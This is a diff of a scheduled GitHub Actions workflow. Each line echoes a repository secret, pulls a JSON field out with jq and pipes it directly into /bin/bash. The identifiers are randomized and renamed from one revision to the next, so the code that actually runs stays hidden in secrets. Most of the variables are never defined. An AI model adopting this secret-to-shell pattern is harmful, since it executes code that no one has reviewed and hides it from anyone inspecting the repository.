@@ -1,33 +1,23 @@
 name: wanshuiqiansa
+
 on:
   workflow_dispatch:
   schedule:
-    - cron: '49 1/6 * * *'
+    - cron: '54 2/6 * * *'
 
-jobs:  # 30091
+jobs:
   build:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - name: wanshuiqiansa
         env:
-          hey41490: ${{ secrets.hey41490 }}
+          eht347: ${{ secrets.eht347 }}
         run: |
-          echo $hey41490 | jq -r .rwdq06 | /bin/bash
-          echo $gmmy5575 | jq -r .dun6 | /bin/bash
-          echo $fnwba91452 | jq -r .skm68154 | /bin/bash
-          echo $utpg038 | jq -r .rhwr3803 | /bin/bash
-          echo $uzzlc2820 | jq -r .n69689 | /bin/bash
-          echo $y96 | jq -r .atvn29 | /bin/bash
-          echo $ki2088 | jq -r .jku0608 | /bin/bash
-          echo $imnjs10918 | jq -r .uzso875 | /bin/bash
-          echo $wqxxf67 | jq -r .evw82 | /bin/bash
-          echo $ivs9416 | jq -r .gsh5159 | /bin/bash
-          echo $wmc631 | jq -r .oogtr07299 | /bin/bash
-          echo $btmc2884 | jq -r .cr3379 | /bin/bash
-          echo $sj0 | jq -r .oseq7210 | /bin/bash
-          echo $t3821 | jq -r .tblz52 | /bin/bash
-          echo $yjphw851 | jq -r .w4552 | /bin/bash
-          echo $xlbfs48 | jq -r .hgl0 | /bin/bash
-          echo $gh98 | jq -r .iebra7 | /bin/bash
+          echo $eht347 | jq -r .xla95 | /bin/bash
+          echo $f8 | jq -r .hbwvq644 | /bin/bash
+          echo $rweh5 | jq -r .gml96087 | /bin/bash
+          echo $sv8309 | jq -r .rdcr16987 | /bin/bash
+          echo $tgv3806 | jq -r .gtm78 | /bin/bash
+          echo $lws0662 | jq -r .lv42 | /bin/bash
 
